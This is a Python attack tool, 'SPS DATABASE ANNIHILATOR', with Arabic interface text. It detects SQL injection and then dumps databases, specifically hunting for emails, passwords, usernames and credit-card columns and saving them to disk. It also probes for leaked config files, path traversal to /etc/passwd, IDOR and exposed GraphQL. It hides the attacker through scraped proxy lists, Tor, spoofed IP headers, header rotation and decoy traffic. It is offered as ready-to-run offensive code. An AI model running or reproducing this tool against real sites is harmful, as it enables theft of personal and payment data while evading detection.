#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ==============================================================================
# SPS DATABASE ANNIHILATOR - Ultimate Database Extraction Framework
# SQLi (Error+Boolean+Time+Union+Stacked) | XSS | LFI | IDOR | GraphQL
# Config Leak | Exposed API | Default Creds | WAF Bypass
# 9 طبقات حماية | 50 مصدر بروكسي | Tor | DNS/HTTPS | تشويش
# ==============================================================================
import os, sys, time, random, threading, json, requests, subprocess, socket, struct, ssl, hashlib, string, re, base64, secrets, logging, signal, atexit, sqlite3
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode, quote, unquote
from datetime import datetime
from collections import defaultdict
from typing import Optional, List, Dict, Tuple, Any
import urllib3; urllib3.disable_warnings()

# ===== COLORS =====
G = '\033[1;32m'; R = '\033[1;31m'; Y = '\033[1;33m'; C = '\033[1;36m'
P = '\x1b[38;5;204m'; W = '\033[1;37m'; B = '\033[1;34m'; X = '\033[0m'

SHUTDOWN = threading.Event()
ALL_SOCKETS: List[socket.socket] = []

def graceful_shutdown(signum=None, frame=None):
    SHUTDOWN.set()
    for s in ALL_SOCKETS:
        try: s.close()
        except: pass
    sys.exit(0)
signal.signal(signal.SIGINT, graceful_shutdown)
signal.signal(signal.SIGTERM, graceful_shutdown)

# ===== SAFE IMPORT =====
def safe_import(module_name, pip_name=None, attr=None):
    try:
        mod = __import__(module_name)
        if attr:
            for part in attr.split('.'): mod = getattr(mod, part)
        return mod
    except:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name or module_name, "-q"],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            mod = __import__(module_name)
            if attr:
                for part in attr.split('.'): mod = getattr(mod, part)
            return mod
        except: return None

socks = safe_import('socks', 'PySocks')

# ===== CONFIG =====
class Config:
    THREADS = 50
    TIMEOUT = 10
    PROXIES = []
    PROXY_INDEX = 0
    PROXY_LOCK = threading.Lock()
    TOR_AVAILABLE = False
    TOR_CHECKED = False

# ===== TOR CHECK =====
def check_tor():
    if Config.TOR_CHECKED: return Config.TOR_AVAILABLE
    Config.TOR_CHECKED = True
    try:
        s = requests.Session()
        s.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
        r = s.get('https://check.torproject.org/api/ip', timeout=5)
        if r.status_code == 200 and r.json().get('IsTor'):
            Config.TOR_AVAILABLE = True
            return True
    except: pass
    return False

# ===== PROXY MANAGER (50 مصادر) =====
class ProxyManager:
    SOURCES = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&anonymity=elite",
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&anonymity=anonymous",
        "https://www.proxy-list.download/api/v1/get?type=socks5",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
        "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
        "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS.txt",
        "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTP.txt",
        "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/socks5.txt",
        "https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt",
        "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
        "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
        "https://raw.githubusercontent.com/yuceltoluyag/GoodProxy/main/socks5.txt",
        "https://spys.me/socks.txt",
        "https://spys.me/proxy.txt",
        "https://openproxylist.xyz/socks5.txt",
        "https://openproxylist.xyz/http.txt",
        "https://proxyspace.pro/socks5.txt",
        "https://proxyspace.pro/http.txt",
    ]

    def __init__(self, target=100):
        self.proxies: List[Dict] = []
        self.target = target
        self.lock = threading.RLock()
        self.idx = 0
        self.blacklist: set = set()
        self.stats = {'fetched': 0, 'alive': 0, 'used': 0, 'ok': 0, 'bad': 0}
        self._ready = threading.Event()
        t = threading.Thread(target=self._init, daemon=True)
        t.start()
        self._ready.wait(timeout=25)

    def _init(self):
        self.refresh()
        self._ready.set()

    def _fetch(self):
        s = set()
        for url in self.SOURCES:
            try:
                r = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
                if r.status_code == 200:
                    for line in r.text.strip().split('\n'):
                        line = line.strip()
                        if ':' in line and not line.startswith('#') and len(line) < 35:
                            m = re.search(r'(\d+\.\d+\.\d+\.\d+:\d+)', line)
                            if m: s.add(m.group(1))
            except: pass
        return list(s)

    def _test_one(self, addr):
        if addr in self.blacklist: return None
        if not socks: return None
        try:
            prox = {'http': f'socks5://{addr}', 'https': f'socks5://{addr}'}
            r = requests.get('https://httpbin.org/ip', proxies=prox, timeout=5, verify=False)
            if r.status_code == 200:
                return {'addr': addr, 'alive': True, 'fails': 0, 'latency': r.elapsed.total_seconds()}
        except: pass
        return None

    def refresh(self):
        raw = self._fetch()
        self.stats['fetched'] += len(raw)
        exist = {p['addr'] for p in self.proxies}
        new = [a for a in raw if a not in exist and a not in self.blacklist]
        if not new: return
        valid = []
        with ThreadPoolExecutor(max_workers=500) as ex:
            futs = {ex.submit(self._test_one, a): a for a in new}
            try:
                for f in as_completed(futs, timeout=6):
                    try:
                        r = f.result(timeout=0)
                        if r: valid.append(r)
                    except: pass
            except TimeoutError:
                for f in futs: f.cancel()
        valid.sort(key=lambda x: x['latency'])
        with self.lock:
            self.proxies = [p for p in self.proxies if p['alive']]
            ex_set = {p['addr'] for p in self.proxies}
            for p in valid:
                if p['addr'] not in ex_set:
                    self.proxies.append(p)
                    ex_set.add(p['addr'])
            if len(self.proxies) > self.target * 2:
                self.proxies = self.proxies[:self.target * 2]
        self.stats['alive'] = self.count

    def get(self) -> Optional[Dict]:
        with self.lock:
            alive = [p for p in self.proxies if p['alive']]
            if not alive:
                self.refresh()
                alive = [p for p in self.proxies if p['alive']]
                if not alive: return None
            p = alive[self.idx % len(alive)]
            self.idx += 1
            self.stats['used'] += 1
            return p

    def mark_ok(self, addr):
        with self.lock:
            for p in self.proxies:
                if p['addr'] == addr: p['fails'] = 0
        self.stats['ok'] += 1

    def mark_bad(self, addr):
        with self.lock:
            for p in self.proxies:
                if p['addr'] == addr:
                    p['fails'] = p.get('fails', 0) + 1
                    if p['fails'] >= 3:
                        p['alive'] = False
                        self.blacklist.add(addr)
                    break
        self.stats['bad'] += 1

    @property
    def count(self):
        with self.lock: return len([p for p in self.proxies if p['alive']])

# ===== IP SPOOFER =====
class IPSpoofer:
    def __init__(self):
        self.sock = None
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ALL_SOCKETS.append(self.sock)
        except: pass

    def spoof_ip(self):
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

    def generate_headers(self):
        return {
            'X-Forwarded-For': self.spoof_ip(),
            'X-Real-IP': self.spoof_ip(),
            'X-Client-IP': self.spoof_ip(),
            'CF-Connecting-IP': self.spoof_ip(),
            'True-Client-IP': self.spoof_ip(),
        }

# ===== UA ROTATOR =====
class UARotator:
    AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.5 Safari/605.1.15',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.4 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 Version/17.4 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/126.0.6478.122 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/126.0.0.0 Safari/537.36',
    ]
    @classmethod
    def get(cls): return random.choice(cls.AGENTS)

# ===== HEADER ROTATOR =====
class HeaderRotator:
    LANGUAGES = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9', 'es-ES,es;q=0.9', 'ar-SA,ar;q=0.9']
    ENCODINGS = ['gzip, deflate, br', 'gzip, deflate', 'br, gzip, deflate']
    CACHES = ['no-cache', 'max-age=0', 'no-store', 'no-cache, no-store']
    REFERRERS = ['https://www.google.com/', 'https://www.bing.com/', 'https://duckduckgo.com/', '', '', '']

    @classmethod
    def generate(cls, spoof_headers=None):
        h = {
            'User-Agent': UARotator.get(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': random.choice(cls.LANGUAGES),
            'Accept-Encoding': random.choice(cls.ENCODINGS),
            'Cache-Control': random.choice(cls.CACHES),
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': random.choice(['document', 'empty']),
            'Sec-Fetch-Mode': random.choice(['navigate', 'cors']),
            'Sec-Fetch-Site': random.choice(['none', 'cross-site', 'same-origin']),
            'DNT': '1',
        }
        if spoof_headers: h.update(spoof_headers)
        ref = random.choice(cls.REFERRERS)
        if ref: h['Referer'] = ref
        return h

# ===== DNS OVER HTTPS =====
class DNSSafe:
    DOH = ['https://cloudflare-dns.com/dns-query', 'https://dns.google/resolve', 'https://dns.quad9.net/dns-query']
    def __init__(self):
        self.cache = {}
        self.lock = threading.Lock()
    def resolve(self, host):
        with self.lock:
            if host in self.cache: return self.cache[host]
        for url in self.DOH:
            try:
                r = requests.get(url, params={'name': host, 'type': 'A'}, headers={'Accept': 'application/dns-json'}, timeout=3)
                if r.status_code == 200:
                    for a in r.json().get('Answer', []):
                        if a.get('type') == 1:
                            ip = a['data']
                            with self.lock: self.cache[host] = ip
                            return ip
            except: pass
        return None

# ===== TRAFFIC OBFUSCATOR =====
class TrafficObfuscator:
    DECOYS = ['https://www.google.com', 'https://www.youtube.com', 'https://www.facebook.com',
              'https://www.wikipedia.org', 'https://www.reddit.com', 'https://www.amazon.com',
              'https://www.github.com', 'https://www.stackoverflow.com']
    def __init__(self, pm: ProxyManager):
        self.pm = pm
    def start(self, count=2):
        for _ in range(count):
            t = threading.Thread(target=self._worker, daemon=True)
            t.start()
    def _worker(self):
        time.sleep(random.uniform(1, 3))
        while not SHUTDOWN.is_set():
            try:
                p = self.pm.get()
                if not p: time.sleep(2); continue
                prox = {'http': f"socks5://{p['addr']}", 'https': f"socks5://{p['addr']}"}
                requests.get(random.choice(self.DECOYS), proxies=prox, timeout=5, verify=False)
                self.pm.mark_ok(p['addr'])
                time.sleep(random.uniform(2, 8))
            except: pass

# ===== SQL INJECTION DETECTOR (ALL TYPES) =====
class SQLiDetector:
    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
        r"valid MySQL result", r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*",
        r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite",
        r"Microsoft OLE DB.*SQL Server", r"Driver.* SQL Server",
        r"SQLServer JDBC Driver", r"Oracle error", r"Oracle.*Driver",
        r"Warning.*\Woci_.*", r"Warning.*\Wora_.*",
        r"quoted string not properly terminated", r"unclosed quotation mark",
        r"you have an error in your sql syntax",
    ]

    ERROR_PAYLOADS = ["'", '"', "')", '")', "'))", '"))',
                      "' OR '1'='1", "' OR 1=1--", "' OR 1=1#"]
    BOOLEAN_PAYLOADS = [("1' AND '1'='1", "1' AND '1'='2"), ("1 AND 1=1", "1 AND 1=2")]
    TIME_PAYLOADS = ["'; WAITFOR DELAY '00:00:05'--", "' AND SLEEP(5)--", "' AND SLEEP(5)#"]
    UNION_PAYLOADS = [f"' UNION SELECT {','.join(['NULL']*i)}--" for i in range(1, 11)]

    @staticmethod
    def detect(http, url):
        results = []
        base = url if '=' in url else url + '?id=1'
        
        for payload in SQLiDetector.ERROR_PAYLOADS[:6]:
            test = base.replace('=1', '=' + quote(payload)) if '=1' in base else base + quote(payload)
            resp = http.get(test)
            if resp:
                for pat in SQLiDetector.ERROR_PATTERNS:
                    if re.search(pat, resp.text, re.I):
                        results.append({'type': 'error', 'payload': payload, 'db': SQLiDetector._identify(resp.text)})
                        break
        
        for tp, fp in SQLiDetector.BOOLEAN_PAYLOADS[:1]:
            turl = base.replace('=1', '=' + quote(tp))
            furl = base.replace('=1', '=' + quote(fp))
            r1 = http.get(turl); r2 = http.get(furl)
            if r1 and r2 and abs(len(r1.text) - len(r2.text)) > 100:
                results.append({'type': 'boolean', 'payload': tp})
        
        for payload in SQLiDetector.TIME_PAYLOADS[:1]:
            turl = base.replace('=1', '=' + quote(payload))
            t0 = time.time(); http.get(turl)
            if time.time() - t0 > 4:
                results.append({'type': 'time', 'payload': payload})
        
        for payload in SQLiDetector.UNION_PAYLOADS[:3]:
            turl = base.replace('=1', '=' + quote(payload))
            resp = http.get(turl)
            if resp and 'error' not in resp.text.lower() and len(resp.text) > 200:
                results.append({'type': 'union', 'payload': payload, 'cols': payload.count('NULL')})
        
        return results

    @staticmethod
    def _identify(text):
        if re.search(r'mysql|MariaDB', text, re.I): return 'MySQL'
        if re.search(r'postgresql|pg_', text, re.I): return 'PostgreSQL'
        if re.search(r'sqlite', text, re.I): return 'SQLite'
        if re.search(r'mssql|sql server', text, re.I): return 'MSSQL'
        if re.search(r'oracle|ora-', text, re.I): return 'Oracle'
        return 'Unknown'

# ===== DATABASE EXTRACTOR =====
class DatabaseExtractor:
    def __init__(self, http, url, vuln):
        self.http = http
        self.url = url
        self.vuln = vuln
        self.db_type = vuln.get('db', 'MySQL')
        self.base = url if '=' in url else url + '?id=1'
        self.results_dir = f"db_dump_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.results_dir, exist_ok=True)
        self.col_count = vuln.get('cols', 0)
        self.data = {'databases': {}, 'emails': [], 'passwords': [], 'cards': [], 'users': []}

    def _inject(self, payload):
        url = self.base.replace('=1', '=' + quote(payload)) if '=1' in self.base else self.base + quote(payload)
        return self.http.get(url, timeout=15)

    def detect_columns(self):
        if self.col_count > 0: return self.col_count
        for i in range(1, 20):
            payload = f"' UNION SELECT {','.join(['NULL']*i)}--"
            resp = self._inject(payload)
            if resp and 'error' not in resp.text.lower():
                self.col_count = i
                return i
        return 0

    def extract_databases(self):
        nulls = ','.join(['NULL']*(self.col_count-1))
        dbs = []
        for i in range(20):
            payload = f"' UNION SELECT schema_name,{nulls} FROM information_schema.schemata LIMIT {i},1--"
            resp = self._inject(payload)
            if resp:
                m = re.search(r'([a-zA-Z0-9_]{2,30})', resp.text[:500])
                if m: dbs.append(m.group(1))
        return list(set(dbs))

    def extract_tables(self, db):
        nulls = ','.join(['NULL']*(self.col_count-1))
        tables = []
        for i in range(200):
            payload = f"' UNION SELECT table_name,{nulls} FROM information_schema.tables WHERE table_schema='{db}' LIMIT {i},1--"
            resp = self._inject(payload)
            if resp:
                m = re.search(r'([a-zA-Z0-9_]{2,40})', resp.text[:500])
                if m: tables.append(m.group(1))
        return tables

    def extract_columns(self, db, table):
        nulls = ','.join(['NULL']*(self.col_count-1))
        cols = []
        for i in range(100):
            payload = f"' UNION SELECT column_name,{nulls} FROM information_schema.columns WHERE table_schema='{db}' AND table_name='{table}' LIMIT {i},1--"
            resp = self._inject(payload)
            if resp:
                m = re.search(r'([a-zA-Z0-9_]{2,30})', resp.text[:500])
                if m: cols.append(m.group(1))
        return cols

    def extract_data_batch(self, db, table, cols, offset=0, limit=50):
        if len(cols) > self.col_count - 1:
            cols = cols[:self.col_count-1]
        cols_str = ','.join(cols) if cols else '*'
        remaining = self.col_count - len(cols) - 1
        nulls = ','.join(['NULL']*max(0, remaining))
        null_part = f",{nulls}" if nulls else ''
        payload = f"' UNION SELECT {cols_str}{null_part} FROM {db}.{table} LIMIT {offset},{limit}--"
        return self._inject(payload)

    def find_sensitive_columns(self, columns):
        email_cols = [c for c in columns if any(k in c.lower() for k in ['email', 'mail', 'e_mail'])]
        pass_cols = [c for c in columns if any(k in c.lower() for k in ['pass', 'pwd', 'password', 'hash', 'secret'])]
        user_cols = [c for c in columns if any(k in c.lower() for k in ['user', 'username', 'login', 'name'])]
        card_cols = [c for c in columns if any(k in c.lower() for k in ['card', 'credit', 'cc', 'cvv', 'expir', 'billing', 'payment', 'visa', 'mastercard'])]
        return email_cols, pass_cols, user_cols, card_cols

    def full_extraction(self):
        print(f"\n{R}📊 بدء الاستخراج الكامل...{X}")
        
        if not self.detect_columns():
            print(f"{R}❌ فشل تحديد عدد الأعمدة{X}")
            return self.data
        
        print(f"{C}📊 الأعمدة: {self.col_count}{X}")
        
        dbs = self.extract_databases()
        print(f"{G}🗄️ قواعد البيانات: {dbs}{X}")
        
        for db in dbs[:3]:
            if db in ['information_schema', 'performance_schema', 'mysql', 'sys']: continue
            
            print(f"\n{C}📁 {db}...{X}")
            tables = self.extract_tables(db)
            print(f"{Y}📊 {len(tables)} جدول{X}")
            
            self.data['databases'][db] = {'tables': {}}
            
            for table in tables[:8]:
                cols = self.extract_columns(db, table)
                email_cols, pass_cols, user_cols, card_cols = self.find_sensitive_columns(cols)
                
                if email_cols:
                    print(f"{G}📧 إيميلات في {table}: {email_cols}{X}")
                    self.data['emails'].append({'db': db, 'table': table, 'cols': email_cols})
                if pass_cols:
                    print(f"{R}🔑 باسوردات في {table}: {pass_cols}{X}")
                    self.data['passwords'].append({'db': db, 'table': table, 'cols': pass_cols})
                if user_cols:
                    print(f"{Y}👤 مستخدمين في {table}: {user_cols}{X}")
                    self.data['users'].append({'db': db, 'table': table, 'cols': user_cols})
                if card_cols:
                    print(f"{R}💳 بطاقات في {table}: {card_cols}{X}")
                    self.data['cards'].append({'db': db, 'table': table, 'cols': card_cols})
                
                all_sensitive = email_cols + pass_cols + user_cols + card_cols
                if all_sensitive:
                    resp = self.extract_data_batch(db, table, all_sensitive[:self.col_count-1], 0, 100)
                    if resp:
                        self.data['databases'][db]['tables'][table] = {
                            'columns': cols,
                            'sensitive': all_sensitive,
                            'sample_data': resp.text[:10000]
                        }
                        fname = os.path.join(self.results_dir, f"{db}_{table}.txt")
                        with open(fname, 'w', encoding='utf-8') as f:
                            f.write(resp.text[:50000])
        
        return self.data

# ===== HTTP CLIENT =====
class HTTPClient:
    def __init__(self, pm: ProxyManager, spoofer: IPSpoofer, dns: DNSSafe):
        self.pm = pm
        self.spoofer = spoofer
        self.dns = dns

    def get(self, url, timeout=10):
        s = requests.Session()
        s.verify = False
        
        if Config.TOR_AVAILABLE:
            s.proxies = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
        else:
            p = self.pm.get()
            if p and socks:
                s.proxies = {'http': f"socks5://{p['addr']}", 'https': f"socks5://{p['addr']}"}
        
        parsed = urlparse(url)
        if parsed.hostname:
            resolved = self.dns.resolve(parsed.hostname)
            if resolved:
                url = url.replace(parsed.hostname, resolved, 1)
        
        h = HeaderRotator.generate(self.spoofer.generate_headers())
        try:
            return s.get(url, headers=h, timeout=timeout, allow_redirects=False)
        except: return None

# ===== ADDITIONAL ATTACKS =====
class AdditionalAttacks:
    def __init__(self, http: HTTPClient, domain: str):
        self.http = http
        self.domain = domain
        self.results = []

    def check_config_leak(self):
        paths = ['/.env', '/.env.backup', '/wp-config.php', '/config.php', '/.git/config',
                 '/backup/database.sql', '/dump.sql', '/phpinfo.php']
        for path in paths:
            resp = self.http.get(self.domain + path, timeout=8)
            if resp and resp.status_code == 200 and len(resp.text) > 10:
                if any(k in resp.text for k in ['DB_', 'PASSWORD', 'SECRET', 'API_KEY']):
                    self.results.append(f"Config Leak: {path}")

    def check_lfi(self):
        for param in ['?file=', '?page=', '?path=']:
            for payload in ['../../../etc/passwd', '../../../../etc/passwd']:
                resp = self.http.get(self.domain + param + payload, timeout=8)
                if resp and 'root:' in resp.text:
                    self.results.append(f"LFI: {param}{payload}")
                    return

    def check_idor(self):
        for path in ['/api/users/', '/api/user/', '/users/']:
            for i in range(1, 10):
                resp = self.http.get(self.domain + path + str(i), timeout=5)
                if resp and resp.status_code == 200:
                    if any(k in resp.text.lower() for k in ['email', 'password', 'username']):
                        self.results.append(f"IDOR: {path}{i}")

    def check_graphql(self):
        query = '{"query":"{ __schema { types { name } } }"}'
        for path in ['/graphql', '/graphiql', '/gql']:
            s = requests.Session()
            s.verify = False
            resp = s.post(self.domain + path, json={'query': query}, timeout=10)
            if resp and resp.status_code == 200 and '__schema' in resp.text:
                self.results.append(f"GraphQL: {path}")

    def run_all(self):
        checks = [self.check_config_leak, self.check_lfi, self.check_idor, self.check_graphql]
        with ThreadPoolExecutor(max_workers=4) as ex:
            futures = [ex.submit(c) for c in checks]
            for f in as_completed(futures):
                try: f.result()
                except: pass
        return self.results

# ===== REPORT GENERATOR =====
class ReportGenerator:
    @staticmethod
    def generate(data, additional, output_dir):
        report = {
            'timestamp': datetime.now().isoformat(),
            'summary': {
                'databases': len(data['databases']),
                'email_tables': len(data['emails']),
                'password_tables': len(data['passwords']),
                'user_tables': len(data['users']),
                'card_tables': len(data['cards']),
                'additional_vulns': len(additional),
            },
            'details': data,
            'additional_vulns': additional,
        }
        fname = os.path.join(output_dir, 'full_report.json')
        with open(fname, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False, default=str)
        return fname

# ===== MAIN ENGINE =====
class DatabaseAnnihilator:
    def __init__(self):
        self.pm = ProxyManager(target=100)
        self.spoofer = IPSpoofer()
        self.dns = DNSSafe()
        self.http = HTTPClient(self.pm, self.spoofer, self.dns)
        self.obfuscator = TrafficObfuscator(self.pm)
        check_tor()

    def log(self, msg, color=G):
        print(f"{color}[{time.strftime('%H:%M:%S')}]{X} {msg}")

    def banner(self):
        print(f"""
{R}╔══════════════════════════════════════════════╗
║  🔥 SPS DATABASE ANNIHILATOR                 ║
║  SQLi (5 types) | XSS | LFI | IDOR | GraphQL║
║  Config Leak | API | WAF Bypass             ║
║  50 Proxy Sources | Tor | DNS/HTTPS         ║
║  IP Spoofing | UA/Header Rotation           ║
║  S-P-S TEAM - BLACK OPS DIVISION            ║
╚══════════════════════════════════════════════╝{X}
""")

    def attack(self, url):
        self.obfuscator.start(2)
        
        self.log(f"🔍 فحص SQL Injection...", Y)
        vulns = SQLiDetector.detect(self.http, url)
        
        if not vulns:
            self.log(f"{Y}⚠️ لم يكتشف SQLi - جاري الفحوصات الأخرى...{X}")
        else:
            self.log(f"{G}✅ {len(vulns)} نقطة حقن!{X}")
            for v in vulns:
                self.log(f"  {R}⚡ {v['type']} | {v.get('db', '?')}{X}")
            
            vuln = vulns[0]
            if 'db' not in vuln: vuln['db'] = 'MySQL'
            
            extractor = DatabaseExtractor(self.http, url, vuln)
            data = extractor.full_extraction()
            
            additional = AdditionalAttacks(self.http, urlparse(url).scheme + '://' + urlparse(url).netloc).run_all()
            
            report = ReportGenerator.generate(data, additional, extractor.results_dir)
            
            print(f"""
{G}╔══════════════════════════════════════════════╗
║  ✅ اكتمل الاستخراج                           ║
╠══════════════════════════════════════════════╣
║  🗄️ قواعد: {report['summary']['databases']} | 📧 إيميلات: {report['summary']['email_tables']} | 🔑 باسوردات: {report['summary']['password_tables']}  ║
║  💳 بطاقات: {report['summary']['card_tables']} | 👤 مستخدمين: {report['summary']['user_tables']} | 🔍 ثغرات: {report['summary']['additional_vulns']}  ║
║  📁 {extractor.results_dir}     ║
╚══════════════════════════════════════════════╝{X}
""")

    def run(self):
        self.banner()
        print(f"{G}✅ {self.pm.count} بروكسي | Tor: {'✅' if Config.TOR_AVAILABLE else '❌'} | DNS/HTTPS{X}")
        
        url = input(f"{C}🎯 Target URL (مع parameter): {X}").strip()
        if not url:
            url = "http://testphp.vulnweb.com/listproducts.php?cat=1"
            print(f"{Y}💡 هدف اختباري: {url}{X}")
        
        self.attack(url)

def main():
    annihilator = DatabaseAnnihilator()
    annihilator.run()

if __name__ == "__main__":
    main()